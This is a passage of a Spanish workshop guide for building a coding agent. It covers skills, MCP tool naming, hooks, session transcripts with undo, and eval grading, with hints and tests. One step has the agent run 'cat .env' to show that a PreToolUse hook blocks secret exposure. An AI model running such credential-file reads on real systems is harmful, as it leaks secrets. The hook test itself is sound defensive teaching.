1. Empieza con un dict vacío; recorre las carpetas en el orden dado y omite las que no sean directorios.
2. `sorted(folder.glob("*/SKILL.md"))` — un nivel de subcarpetas, exactamente ese nombre de fichero.
3. Aplica `FRONTMATTER`; sin coincidencia → omítelo. Carga el YAML (protégete contra `None`).
4. Exige `name` y `description`; colapsa todos los espacios en blanco de la descripción en espacios simples.
5. Guarda `Skill(...)` con la ruta del propio fichero `SKILL.md` (10.4 lo vuelve a leer).

**Cuidado con:**
- Un valor YAML multilínea (`description: How to make\n  commits here.`) lo pliega YAML, pero sé explícito: `" ".join(str(d).split())` garantiza espacios simples y ningún salto de línea, que es lo que `catalog()` necesita para producir `- commits: How to make commits here.`.
- Salir antes de tiempo cuando falta la primera carpeta: la carpeta del usuario (`~/.forja/skills`) normalmente no existe — omítela y sigue.
- Guardar la carpeta en vez de la ruta de `SKILL.md`: entonces 10.4 no consigue leer el cuerpo.

<details><summary>💡 Pista 1</summary>

Es otra vez 09.1 con otro glob y otra dataclass.

</details>

<details><summary>💡 Pista 2</summary>

`folder.glob("*/SKILL.md")`, `FRONTMATTER.match(f.read_text(encoding="utf-8"))`, `" ".join(str(meta["description"]).split())`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
out = {}
for folder in folders:
    if not folder.is_dir(): continue
    for f in sorted(folder.glob(...)):
        m = ...; meta = ...            # None-safe
        if <valid>:
            out[meta["name"]] = Skill(..., ..., f)
return out
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k skills -v
```

#### TODO 10.4 · `forja/skills.py` · `make_skill_tool(skills)` → herramienta interna `skill(name: str) -> str`

**Qué debe hacer:** Nombre desconocido → `ValueError` listando las skills disponibles (o `none`). Nombre conocido → vuelve a leer `skill.path`, quita el frontmatter y devuelve `# Skill: <name>`, una línea con la carpeta (`(folder: <path.parent>)`, para que el modelo encuentre scripts/plantillas junto a `SKILL.md`), una línea en blanco y el CUERPO con strip. El test comprueba que el resultado contiene `Use conventional commits.` y NO contiene `---`. No cambies el docstring: se convierte en la descripción de la herramienta y la sección `Args:` documenta `name`.

**Pasos:**
1. Busca `skills.get(name)`; si no está, lanza `ValueError` con la lista de nombres.
2. Vuelve a leer el fichero (el cuerpo no se cachea: eso es la revelación progresiva).
3. Aplica `FRONTMATTER.match` y quédate con el grupo 2 con strip; si por lo que sea no casa, usa el texto entero como alternativa.
4. Devuelve la cabecera, la línea de la carpeta y el cuerpo.

**Cuidado con:**
- Devolver el fichero entero: las líneas `---` del frontmatter se cuelan en el resultado y el test falla en `"---" not in out`.
- Devolver un string de error en vez de lanzar: "funciona", pero el resultado de la herramienta se marca como ok y el modelo no sabe que falló.
- Si `test_skills` falla en `"commits" in llm.calls[0]["messages"][0]["content"]`, el catálogo no está llegando al system prompt: eso requiere que `build_system_prompt` del lab 06 incluya `skills_catalog`.

<details><summary>💡 Pista 1</summary>

El catálogo (solo descripciones) ya está en el prompt; esta herramienta devuelve la parte que se dejó fuera.

</details>

<details><summary>💡 Pista 2</summary>

`m = FRONTMATTER.match(s.path.read_text(encoding="utf-8"))`; `m.group(2).strip()`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
s = skills.get(name)
if s is None:
    raise ValueError(f"unknown skill: {name}. Available: ...")
body = ...    # text without frontmatter
return f"# Skill: {s.name}\n(folder: ...)\n\n{body}"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k skills -v
```

#### TODO 10.5 · `forja/mcp_tools.py` · `mcp_tool_name(server: str, tool: str) -> str`

**Qué debe hacer:** Devuelve `mcp__<server>__<tool>` donde cada carácter fuera de `[a-zA-Z0-9_]` en server Y en tool se sustituye por `_` (usa la regex precompilada `NAME_RE`). Tests: `("issues", "get_issue") -> "mcp__issues__get_issue"`, `("my-wiki", "search.docs") -> "mcp__my_wiki__search_docs"`. `connect_servers` (ya escrita) la usa para renombrar cada herramienta MCP; las herramientas MCP tienen riesgo `exec`, así que pasan por los permisos.

**Pasos:**
1. Sanea el nombre del servidor con `NAME_RE.sub("_", ...)`.
2. Sanea el nombre de la herramienta de la misma forma.
3. Únelos con el prefijo `mcp__` y un doble guion bajo entre ellos.

**Cuidado con:**
- Guiones bajos simples (`mcp_issues_get_issue`): las reglas de permisos como `mcp__issues__*` en `settings.json` no casarán nunca.
- Sanear solo el nombre de la herramienta: un servidor llamado `my-wiki` produce un nombre de herramienta inválido que algunos modelos/servidores rechazan.

<details><summary>💡 Pista 1</summary>

Una línea con un f-string.

</details>

<details><summary>💡 Pista 2</summary>

`NAME_RE.sub("_", server)` sustituye cada carácter prohibido.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
return f"mcp__{...}__{...}"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l10_extensions.py -k mcp -v
```

### Ejecuta
```bash
python scripts/tasks.py test 10
cp -r examples/project/.forja playground/      # si no lo hiciste en el lab 09
forja --cwd playground
> lista las issues abiertas, arregla la #12 y comenta en la issue qué cambiaste
> haz commit siguiendo la convención del repo
```

### Pruébalo en tu agente
1. Asegúrate de que existe `playground/.forja/` (copiado en el lab 09). La ruta del servidor MCP en `settings.json` (`../examples/mcp/issues_server.py`) se resuelve desde la raíz del proyecto (`playground/`), así que `forja --cwd playground` desde la raíz del repo funciona. Si el servidor falla verás una nota al arrancar `· MCP 'issues': …` y ninguna herramienta MCP.
2. `/tools` → deberías ver `mcp__issues__list_issues`, `mcp__issues__get_issue`, `mcp__issues__comment_issue` con `[exec]`, y `skill [read]`.
3. `list the open issues, fix #12 and comment on the issue what you changed`. Esperado: `⏺ mcp__issues__list_issues` (sin pedir aprobación: `mcp__issues__*` está en `allow`), lecturas/ediciones en `invoices/amounts.py`, una comprobación de compilación PostToolUse tras cada edición y, finalmente, `mcp__issues__comment_issue`.
4. Observa el hook Stop (`.forja/hooks/stop_tests.py`): solo se ejecuta si hay cambios sin commitear en el proyecto (git), así que las preguntas no le afectan. Si el agente editó ficheros y dice que ha terminado con los tests en rojo, verás que sigue trabajando (se inyecta un mensaje de usuario `[Stop hook] You are not done yet…` con el final de la salida de pytest). Se rinde tras 3 rondas extra.
5. `commit following the repo's convention` → la primera llamada debería ser `⏺ skill conventional-commits`, luego `git status`/`git diff`, y después un mensaje de commit como `fix(amounts): …`. (Se te pedirá aprobar `git commit`: no está en `allow`.)
6. Prueba el hook PreToolUse: `run cat .env` → el resultado muestra `BLOCKED by hook: Command blocked by policy: it may expose secrets…`.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `test_hook_matching_and_exit_codes`: `assert out.message == 'no'` falla con `'no\n'` | No hiciste strip → haz `.strip()` de `message`/`context` acumulados al final. |
| `len(out.errors) == 1` falla (0 errores) | Haces `break` tras el hook que bloquea, así que el hook con salida 1 nunca se ejecuta → ejecuta todos los hooks que casen. |
| `TypeError: a bytes-like object is required` en `subprocess.run` | Falta `text=True` → añádelo (input/stdout/stderr pasan a ser `str`). |
| Windows: el test de hooks falla con `'C:/…/python.exe' is not recognized` o errores de comillas | Si ejecutas sin `shell=True`, cmd.exe nunca interpreta el comando entrecomillado → mantén `shell=True` y pasa el comando como un único string. |
| Las respuestas terminan con `[Stop hook] You are not done yet…` aunque solo hayas hecho una pregunta | `stop_tests.py` ejecuta los tests siempre que haya cambios sin commitear en `playground/` (p. ej. un arreglo a medias de un lab anterior) → termina el arreglo o haz `python scripts/tasks.py reset`. Fuera de git se ejecuta siempre. |
| No hay herramientas `mcp__issues__*`; nota al arrancar `· MCP 'issues': …` | El servidor no arrancó → comprueba que la ruta es relativa a la raíz del proyecto (`playground/`), que `mcp` está instalado (`pip show mcp`), y ejecuta el servidor a mano: `python examples/mcp/issues_server.py`. |
| El hook PostToolUse/PreToolUse nunca se dispara para herramientas MCP | El matcher es una regex con `fullmatch` → usa `mcp__issues__.*`, no el glob `mcp__issues__*`. |
| El modelo nunca llama a `skill` | Los modelos pequeños ignoran los catálogos → haz que la descripción de la skill diga CUÁNDO cargarla ('Load it before running git commit') y menciónala en el prompt. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 10` → 5 passed (incluido `test_mcp_end_to_end`).
- [ ] [ ] En el CLI: `cat .env` queda bloqueado por el hook PreToolUse, y el hook Stop hace que el agente continúe mientras los tests están en rojo.
- [ ] [ ] `/tools` lista `skill` y las herramientas `mcp__issues__*`, y el agente carga `conventional-commits` antes de hacer commit.

### Checkpoint
El hook Stop no deja terminar con tests en rojo; el agente carga la skill `conventional-commits` antes de hacer commit; las tools `mcp__issues__*` aparecen en `/tools`.

### Retos
1. Hook PostToolUse que ejecute `ruff` sobre el fichero editado.
2. Conecta un servidor MCP real de tu equipo.

**Tests:** `tests/test_l10_extensions.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 11`


---

## Lab 11 · Sesiones y deshacer

*Día 2 · 14:20–14:55*

**Objetivo:** Retomar sesiones y deshacer lo que hizo el agente sin depender de git.

### Conceptos
- **Transcript JSONL append-only:** un mensaje por línea en `.forja/sessions/`. Reanudar, auditar y depurar. Tras compactar, una marca con el nuevo estado.
- **Checkpoints:** antes de que una tool modifique un fichero, se guarda su contenido original (o que no existía) — solo la primera vez por turno.
- **/undo:** restaura los ficheros del último turno con cambios. Funciona en carpetas sin git y no toca tus commits.
- **Límite:** los efectos de `bash` (instalar paquetes, borrar con `rm`) no se deshacen. Por eso bash pasa por permisos.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 11.1 | `forja/session.py` | Transcript.append |
| 11.2 | `forja/session.py` | Transcript.load (con marcas de compactación) |
| 11.3 | `forja/session.py` | Checkpoints.before_write |
| 11.4 | `forja/session.py` | Checkpoints.undo |

### Antes de empezar
- Abre `forja/session.py`. Dos clases independientes: `Transcript` (11.1, 11.2: un fichero JSONL por sesión en `<project>/.forja/sessions/<id>.jsonl`) y `Checkpoints` (11.3, 11.4: una pila en memoria de turnos, cada uno `{Path: original bytes | None}`). `mark_compaction` y `list_sessions` ya están escritas: léelas, te dicen el formato de línea (`{"ts": ..., "message": m}` y `{"ts": ..., "compacted": [...]}`).
- Cómo las usa el harness: al final de `Forja.turn` llama a `self.transcript.append(*self.history[start:])` (solo los mensajes NUEVOS); `resume(id)` llama a `Transcript.load(folder, id)`. `Forja.turn` llama a `self.checkpoints.begin_turn()`, y `Workspace` llama a `checkpoints.before_write(path)` justo ANTES de que `write_file`/`edit_file` toquen un fichero (ver `forja/fs_tools.py`). `/undo` llama a `Checkpoints.undo()`.
- Stdlib: `json.dumps(obj, ensure_ascii=False)`, `json.loads(line)`, `Path.open("a", encoding="utf-8")` (modo append), `Path.read_bytes()` / `write_bytes()` (bytes, para que codificaciones y finales de línea se restauren exactamente), `Path.unlink(missing_ok=True)`, `Path.mkdir(parents=True, exist_ok=True)`.
- Límite a tener en cuenta: solo las herramientas de ficheros crean checkpoints. Lo que haga `bash` (`rm`, `pip install`, `sed -i`) no se puede deshacer.

### Paso a paso
11.1 y 11.2 juntos (un test de ida y vuelta: `test_transcript_roundtrip`), luego 11.3 y 11.4 juntos (`test_checkpoints`). Termina con `test_harness_resume_and_undo`, que lo ejercita todo a través del harness real (necesita los labs 02-04 para `edit_file` en `accept_edits`).

#### TODO 11.1 · `forja/session.py` · `Transcript.append(self, *messages: dict) -> None`

**Qué debe hacer:** Crea `self.folder` si hace falta, abre `self.path` en modo APPEND (UTF-8) y escribe una línea por mensaje: `json.dumps({"ts": <time.time() rounded>, "message": m}, ensure_ascii=False) + "\n"`. Nunca reescribe líneas anteriores. Se llama varias veces sobre el mismo fichero (el test añade 2 mensajes, luego 1 más, luego un marcador de compactación, luego 1 más).

**Pasos:**
1. `self.folder.mkdir(parents=True, exist_ok=True)`.
2. Abre `self.path` con modo `"a"` y `encoding="utf-8"` en un bloque `with`.
3. Para cada mensaje escribe un objeto JSON por línea con las claves `ts` y `message`.

**Cuidado con:**
- El modo `"w"` trunca el fichero: tras el segundo `append` solo sobrevive el último mensaje y la ida y vuelta falla.
- Olvidar el `"\n"` final: dos registros en una línea → `json.JSONDecodeError: Extra data` en `load`.
- Windows: sin `encoding="utf-8"` la página de códigos por defecto (cp1252) falla con `€`, `→` o texto acentuado en los mensajes.
- Usa exactamente la clave `message`: `list_sessions` (ya escrita) lee `.get("message")`.

<details><summary>💡 Pista 1</summary>

JSON Lines = un documento JSON completo por línea, que solo se va añadiendo.

</details>

<details><summary>💡 Pista 2</summary>

`with self.path.open("a", encoding="utf-8") as f:` y luego `f.write(json.dumps({...}, ensure_ascii=False) + "\n")`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
self.folder.mkdir(...)
with self.path.open(...) as f:
    for m in messages:
        f.write(...)   # {'ts': ..., 'message': m} + newline
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l11_sessions.py -k transcript -v
```

#### TODO 11.2 · `forja/session.py` · `Transcript.load(folder: Path, session_id: str) -> list[dict]` (staticmethod)

**Qué debe hacer:** Lee `<folder>/<session_id>.jsonl`; si no existe lanza `FileNotFoundError`. Reconstruye el historial línea a línea: un registro con `compacted` SUSTITUYE el historial entero por esa lista; un registro con `message` se añade. Omite las líneas en blanco. Test: tras `[hello, how are you, second]` + compactación `[[Summary] x]` + `continuing`, el resultado es `["[Summary] x", "continuing"]`. El test del harness comprueba `app2.history == app.history` tras `resume`, así que los mensajes deben volver sin cambios (incluidos los `tool_calls`).

**Pasos:**
1. Construye la ruta `folder / f"{session_id}.jsonl"`; lanza `FileNotFoundError` si no es un fichero.
2. Empieza con una lista vacía y lee el fichero como UTF-8, línea a línea.
3. Omite las líneas vacías; aplica `json.loads` al resto.
4. Si el registro tiene `compacted` → sustituye el historial por una copia de esa lista; si no, añade `record["message"]`.
5. Devuelve el historial.

**Cuidado con:**
- Añadir la lista compactada en vez de sustituir: obtienes `hello, how are you, second, [Summary] x, continuing`.
- Comprobar primero `if "message" in rec` e ignorar el resto descarta en silencio los marcadores de compactación — comprueba `compacted` primero.
- Una línea vacía al final hace que `json.loads("")` lance excepción — omite las líneas en blanco.

<details><summary>💡 Pista 1</summary>

El fichero es un log de eventos; reprodúcelo para reconstruir el estado.

</details>

<details><summary>💡 Pista 2</summary>

`for line in p.read_text(encoding="utf-8").splitlines():` y `rec = json.loads(line)`; ramifica según `"compacted" in rec`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
p = folder / f"{session_id}.jsonl"
if not p.is_file(): raise FileNotFoundError(...)
history = []
for line in ...:
    if not line.strip(): continue
    rec = ...
    if "compacted" in rec: history = ...
    else: history.append(...)
return history
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l11_sessions.py -k transcript -v
```

#### TODO 11.3 · `forja/session.py` · `Checkpoints.before_write(self, path: Path) -> None`

**Qué debe hacer:** Registra el estado ORIGINAL de `path` en el turno actual (el último) de `self.stack`: `path.read_bytes()` si existe, `None` si no. Solo la PRIMERA vez que se ve una ruta dada en ese turno (escrituras posteriores en el mismo turno no deben sobrescribir el original). Si aún no hay turno (`self.stack` vacío), llama antes a `self.begin_turn()`. Test: `a.txt` escrito dos veces en un turno debe deshacerse a `"original"`; `new.txt` creado en el turno debe borrarse al deshacer.

**Pasos:**
1. Si `self.stack` está vacío, `self.begin_turn()`.
2. Toma el dict del turno actual: `self.stack[-1]`.
3. Si `path` ya es una clave, no hagas nada.
4. Si no, guarda `path.read_bytes()` si `path.exists()`, o `None` en caso contrario.

**Cuidado con:**
- Sobrescribir el valor guardado en cada llamada: tras `v1` → `v2` deshacer restauraría `v1`, no `original`.
- Guardar texto (`read_text`) en vez de bytes: los finales de línea CRLF en Windows y los ficheros no UTF-8 no vuelven exactamente igual.
- Llamar a `begin_turn()` incondicionalmente aquí: cada escritura abriría un turno nuevo y `/undo` solo revertiría la última escritura.

<details><summary>💡 Pista 1</summary>

`None` significa "este fichero no existía antes" — deshacer lo borrará.

</details>

<details><summary>💡 Pista 2</summary>

`turn = self.stack[-1]`; `if path not in turn: turn[path] = ...`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
if not self.stack: ...
turn = self.stack[-1]
if path not in turn:
    turn[path] = ...  # bytes or None
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l11_sessions.py -k checkpoints -v
```

#### TODO 11.4 · `forja/session.py` · `Checkpoints.undo(self) -> list[Path]`

**Qué debe hacer:** Descarta los turnos VACÍOS de la cima de la pila (turnos en los que no se escribió nada), luego saca el último turno no vacío y restaura cada fichero que contiene: bytes originales → vuelve a escribirlos (creando las carpetas padre); `None` → borra el fichero (sin error si ya no está). Devuelve las rutas restauradas ORDENADAS. Nada que deshacer → `[]`. Test: un turno vacío en la cima se omite, ambos ficheros se restauran, y un segundo `undo()` devuelve `[]`. El `/undo` del CLI imprime `restored: <paths>` o `nothing to undo`.

**Pasos:**
1. Mientras la pila no esté vacía y su último turno esté vacío, sácalo.
2. Si la pila queda vacía, devuelve `[]`.
3. Saca el último turno.
4. Para cada `(path, original)`: si `original is None` → `unlink(missing_ok=True)`; si no, `mkdir` del padre y `write_bytes(original)`.
5. Devuelve `sorted(...)` de las rutas del turno.

**Cuidado con:**
- No omitir los turnos vacíos: el harness llama a `begin_turn()` en CADA turno, así que una pregunta tras una edición haría que `/undo` dijera 'nothing to undo'.
- Mirar (`self.stack[-1]`) en vez de sacar: un segundo `undo()` restauraría otra vez el mismo turno en vez de devolver `[]`.
- Reescribir un fichero cuya carpeta se borró mientras tanto → `FileNotFoundError`; crea antes los padres.

<details><summary>💡 Pista 1</summary>

Piensa en la pila como una lista de instantáneas solo de los ficheros que tocó cada turno.

</details>

<details><summary>💡 Pista 2</summary>

`while self.stack and not self.stack[-1]: self.stack.pop()`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
# drop empty turns from the end
if not self.stack: return []
turn = self.stack.pop()
for path, original in turn.items():
    if original is None: ...   # delete
    else: ...                  # mkdir parent + write bytes
return sorted(turn)
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l11_sessions.py -k "checkpoints or resume_and_undo" -v
```

### Ejecuta
```bash
python scripts/tasks.py test 11
forja --cwd playground --mode accept_edits
> cambia el vencimiento por defecto a 60 días
/undo
/sessions
forja --cwd playground --resume <id>
```

### Pruébalo en tu agente
1. `forja --cwd playground --mode accept_edits` y escribe `change the default due-date period to 60 days`. Esperado: un `edit_file invoices/dates.py` con un panel de diff (`days: int = 30` → `60`), sin pedir aprobación (accept_edits).
2. `/undo` → `restored: invoices/dates.py`. Comprueba el fichero: vuelve a poner `30`. `/undo` otra vez → `nothing to undo`.
3. Haz una pregunta simple (`what does due_date do?`), haz otra edición, otra pregunta, y luego `/undo`: sigue revirtiendo el último turno CON cambios (los turnos vacíos se omiten).
4. `/sessions` → líneas como `20261103-143012-a1b2  change the default due-date period to 60 days`. Mira el fichero en bruto: macOS/Linux `cat playground/.forja/sessions/<id>.jsonl` · PowerShell `Get-Content playground\.forja\sessions\<id>.jsonl` — un objeto JSON por línea.
5. `/exit`, luego `forja --cwd playground --resume <id>` y pregunta `what did you change before?` → el agente responde a partir del historial restaurado.
6. Fíjate en lo que NO se deshace: pide al agente `create a file tmp.txt using bash` y `/undo` → `tmp.txt` sigue ahí (`/undo` dice `nothing to undo`, o revierte en su lugar un turno de edición ANTERIOR). Limpia con `python scripts/tasks.py reset` si hace falta.

### Si algo falla
| Síntoma | Causa → solución |
|---|---|
| `json.decoder.JSONDecodeError: Extra data` en `load` | Dos registros en la misma línea → añade `"\n"` tras cada `json.dumps` en `append`. |
| La ida y vuelta devuelve solo el último mensaje | Abriste el fichero con `"w"` → usa el modo append `"a"`. |
| `test_checkpoints`: `a.txt` se restaura a `v1` en vez de `original` | `before_write` sobrescribe el original guardado → guárdalo solo la primera vez que aparece la ruta en el turno. |
| `/undo` siempre dice `nothing to undo` tras una pregunta posterior | No se omiten los turnos vacíos de la cima de la pila → saca los turnos vacíos antes de sacar el real. |
| `test_harness_resume_and_undo`: falla `app2.history == app.history` | Los mensajes se modifican por el camino (p. ej. guardaste `str(m)` o solo `content`) → vuelca el dict entero como JSON y cárgalo de vuelta sin cambios. |
| `UnicodeEncodeError` / texto corrupto en `.jsonl` en Windows | La página de códigos por defecto no es UTF-8 → pasa `encoding="utf-8"` al abrir y al leer, y mantén `ensure_ascii=False`. |
| `--resume` dice que la sesión no existe | Las sesiones viven en `<project>/.forja/sessions/` → reanuda con el mismo `--cwd` que usaste al crearla, y copia el id de `/sessions`. |

### Has terminado cuando
- [ ] [ ] `python scripts/tasks.py test 11` → 3 passed.
- [ ] [ ] `/undo` restaura un fichero editado por el agente y borra un fichero que creó, sin git.
- [ ] [ ] `forja --cwd playground --resume <id>` continúa la conversación anterior.

### Checkpoint
`/undo` deja el fichero como estaba y `--resume` continúa la conversación anterior.

### Retos
1. `/undo N` para deshacer varios turnos.
2. `/rewind`: deshacer ficheros Y volver el historial al mismo punto.

**Tests:** `tests/test_l11_sessions.py` · **¿Te has quedado atrás?** `python scripts/tasks.py catchup 12`


---

## Lab 12 · Evals: medir tu agente

*Día 2 · 14:55–16:00*

**Objetivo:** Comparar modelos y cambios del harness con tareas reales y comprobaciones objetivas.

### Conceptos
- **Sin medir, todo es opinión.** ¿Es mejor `qwen3-coder:30b` que `qwen3:8b`? ¿Tu nuevo prompt ayuda? Se mide.
- **Tarea = prompt + comprobación objetiva** sobre una COPIA limpia del proyecto: tests (`command`), tests OCULTOS que se copian después (`hidden`, para que no haga trampa), contenido de la respuesta (`answer_contains`) y no modificar nada (`forbid_changes`).
- **Headless + bypass dentro de la copia:** el sandbox es la carpeta temporal.
- **Varias repeticiones:** los modelos no son deterministas. Mira pass rate, pasos, tiempo y tokens.

### Lo que implementas
| TODO | Fichero | Qué |
|---|---|---|
| 12.1 | `forja/evals.py` | grade: aplicar las comprobaciones |
| 12.2 | `forja/evals.py` | summarize: pass rate, por tarea, pasos, tiempo, tokens |

### Antes de empezar
- Abre `forja/evals.py` (tus TODOs: `grade` y `summarize`) y `evals/tasks.yaml` (las tareas). Ya escritas para ti: `load_tasks`, `snapshot(root)` (dict `relative path -> sha1`, ignorando `.forja`, `.git`, `__pycache__`, `.pytest_cache`), `norm(s)` (minúsculas + quitar acentos) y `run_task`, que copia `playground/` a un directorio temporal, ejecuta UN turno headless en modo `bypass` y luego llama a tu `grade(task, work, answer, before, repo_root)`.
- El runner es `evals/run_evals.py` (vía `python scripts/tasks.py evals ...`): flags `--model`, `--backend`, `--repeat N`, `--only <id>`, `--max-steps`, `--config <carpeta .forja>` (usa tus settings, hooks, skills y subagentes en cada tarea), `--mcp` y `--label <sufijo>` para el nombre del informe. Imprime una línea `PASS`/`FAIL` por ejecución, llama a tu `summarize` y escribe `out/evals_<model>.json` (`/` y `:` en el nombre del modelo se convierten en `_`).
- Stdlib: `subprocess.run(cmd, shell=True, cwd=workdir, capture_output=True, text=True, timeout=...)` y `subprocess.TimeoutExpired`; `shutil.copy(src, dst)`; `statistics.mean`; `dataclasses.asdict`. Campos de `TaskResult`: `id, passed, reason, steps, tool_calls, tokens, seconds, stop_reason, answer`.
- El dict `check` de una tarea puede contener: `command` (salida 0 = pass, `timeout` opcional, 120 s por defecto), `hidden` (`{repo-relative source: workdir-relative destination}`, copiado DESPUÉS de que el agente termine), `answer_contains` (lista de strings), `forbid_changes` (bool).
- Las evals usan TODO tu agente (labs 01-11). `test_run_task_pass_and_fail` maneja `read_file`, `edit_file` y `bash` a través del harness, así que esos labs deben pasar.

### Paso a paso
12.1 primero (`test_grade_answer_and_forbid_changes`, `test_hidden_tests_copied_after`, luego `test_run_task_pass_and_fail`), porque `run_task` y el runner dependen de ello. 12.2 es aritmética independiente (`test_summarize`). Después ejecuta evals reales: empieza con `--only vat_question` (rápida, solo lectura).

#### TODO 12.1 · `forja/evals.py` · `grade(task, workdir, answer, before, repo_root) -> tuple[bool, str]`

**Qué debe hacer:** Aplica las comprobaciones en ESTE orden y vuelve en el primer fallo: (1) `forbid_changes` y `snapshot(workdir) != before` → `(False, <reason containing 'modified'>)`; (2) `answer_contains`: cada string, comparado con `norm()` en ambos lados, debe estar en la respuesta, si no `(False, <reason listing the missing ones>)`; (3) copia cada fichero `hidden` de `repo_root / src` a `workdir / dst` (crea las carpetas padre); (4) si hay `command`: ejecútalo en `workdir` con `shell=True`; timeout → `(False, ...)`; salida distinta de cero → `(False, <reason containing 'failed'> + the last 3 lines of stdout+stderr)`. Todo bien → exactamente `(True, "ok")` (el test compara la tupla).

**Pasos:**
1. Lee `chk = task.check`.
2. Si `chk.get("forbid_changes")` y la instantánea actual difiere de `before`, falla con un motivo 'modified files…'.
3. Recoge los strings de `answer_contains` cuyo `norm(str(s))` no esté en `norm(answer)`; si hay alguno, falla y lístalos.
4. Para cada `(src, dst)` en `chk.get("hidden") or {}`: crea `(workdir / dst).parent` y `shutil.copy(repo_root / src, workdir / dst)`.
5. Si hay un `command`, ejecútalo en `workdir` con `capture_output=True, text=True, timeout=chk.get("timeout", 120)`; gestiona `TimeoutExpired`.
6. Si la salida no es cero, une en el motivo las últimas 3 líneas no vacías (tras trim) de `stdout + stderr` (p. ej. `"check failed: " + " | ".join(tail)`).
7. Devuelve `(True, "ok")`.

**Cuidado con:**
- Copiar los ficheros `hidden` ANTES de la comprobación de `forbid_changes`: tu propia copia cuenta como cambio. El orden importa.
- No usar `norm()`: `"VAT"` debe casar con `"the vat"` en la respuesta del test (sin distinguir mayúsculas; también se quitan los acentos).
- Copiar los tests ocultos solo cuando el comando pasa: `test_hidden_tests_copied_after` comprueba que el fichero existe aunque la comprobación falle.
- Olvidar `cwd=workdir`: el comando se ejecuta contra el playground REAL (o la raíz del repo) y el resultado no significa nada.
- Windows: strings de `command` como `python -m pytest -q` necesitan `python` en el PATH → activa el venv en el terminal donde ejecutes las evals.

<details><summary>💡 Pista 1</summary>

Primero las comprobaciones baratas, luego los efectos secundarios (copiar ficheros), luego la cara (ejecutar el comando).

</details>

<details><summary>💡 Pista 2</summary>

`missing = [s for s in chk.get("answer_contains", []) if norm(str(s)) not in norm(answer)]`; `tail = (p.stdout + p.stderr).strip().splitlines()[-3:]`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
chk = task.check
if chk.get("forbid_changes") and ...: return False, "modified files in a read-only task"
missing = ...
if missing: return False, f"the answer is missing: {missing}"
for src, dst in ...: ...   # mkdir + copy
if chk.get("command"):
    try: p = subprocess.run(...)
    except subprocess.TimeoutExpired: return False, ...
    if p.returncode != 0: return False, "check failed: " + ...
return True, "ok"
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l12_evals.py -k "grade or hidden or run_task" -v
```

#### TODO 12.2 · `forja/evals.py` · `summarize(results: list[TaskResult], model: str) -> dict`

**Qué debe hacer:** Devuelve un dict con las claves: `model`; `runs` = número de resultados; `pass_rate` = passed / runs redondeado a 3 decimales; `per_task` = `{task id: pass rate rounded to 2}` (agrupando las repeticiones del mismo id); `avg_steps` y `avg_seconds` = medias redondeadas a 1 decimal (0 si no hay resultados); `total_tokens` = suma de tokens; `results` = `[asdict(r) for r in results]`. Test: 3 resultados → `pass_rate == 0.667`, `per_task == {"a": 0.5, "b": 1.0}`, `avg_steps == 4.0`, `total_tokens == 350`, `len(results) == 3`.

**Pasos:**
1. Agrupa los resultados por `r.id` en un dict de listas (`setdefault` viene bien).
2. Calcula la tasa de aciertos global; protégete contra la división por cero con una lista vacía.
3. Calcula la tasa de aciertos por tarea a partir de cada grupo.
4. Calcula las medias de `steps` y `seconds` (protege la entrada vacía), y la suma de tokens.
5. Monta el dict exactamente con las claves de arriba; `results` vía `asdict`.

**Cuidado con:**
- Redondeo: `pass_rate` 3 decimales (`0.667`), `per_task` 2 decimales, medias 1 decimal. El test usa `==`.
- `statistics.mean([])` lanza `StatisticsError` → protege las listas vacías (el runner con un `--only` erróneo da cero resultados).
- `sum(r.passed for r in ...)` funciona porque `True == 1`; no cuentes `reason == "ok"` en su lugar.
- `run_evals.py` lee `rep["pass_rate"]`, `rep["avg_steps"]`, `rep["avg_seconds"]`, `rep["total_tokens"]`, `rep["per_task"]`, `rep["model"]` — una errata en el nombre de una clave hace que el runner pete después de todas las ejecuciones (lentas).

<details><summary>💡 Pista 1</summary>

Agrupa y luego agrega. Todo es una suma, un conteo o una media.

</details>

<details><summary>💡 Pista 2</summary>

`by_task.setdefault(r.id, []).append(r)`; `round(statistics.mean(r.steps for r in results), 1)`.

</details>

<details><summary>💡 Pista 3 · esqueleto</summary>

```python
by_task = {}
for r in results: ...
n = len(results) or 1
return {
    "model": model, "runs": ...,
    "pass_rate": round(..., 3),
    "per_task": {k: round(..., 2) for k, v in by_task.items()},
    "avg_steps": ..., "avg_seconds": ..., "total_tokens": ...,
    "results": [asdict(r) for r in results],
}
```

</details>

**Comprueba solo este TODO:**
```bash
python -m pytest tests/test_l12_evals.py -k summarize -v
```

### Ejecuta
```bash
python scripts/tasks.py test 12
python scripts/tasks.py evals --only fix_rounding
python scripts/tasks.py evals --repeat 3
python scripts/tasks.py evals --model qwen3-coder:30b --repeat 3
python scripts/tasks.py evals --repeat 3 --config playground/.forja --label config   # con tus hooks, skills y subagentes
```

### Pruébalo en tu agente
1. `python scripts/tasks.py evals --only vat_question` (solo lectura, la más rápida). Esperado: `» …run_evals.py --only vat_question`, luego una línea como `PASS  vat_question           18.4s   4 steps` (o `FAIL … the answer is missing: ['calculate_vat']`), y después el resumen `qwen3:8b: pass_rate 100% · 4.0 steps · 18.4s/task · 9123 tokens`, `per task: {...}` y `-> out/evals_qwen3_8b.json`.
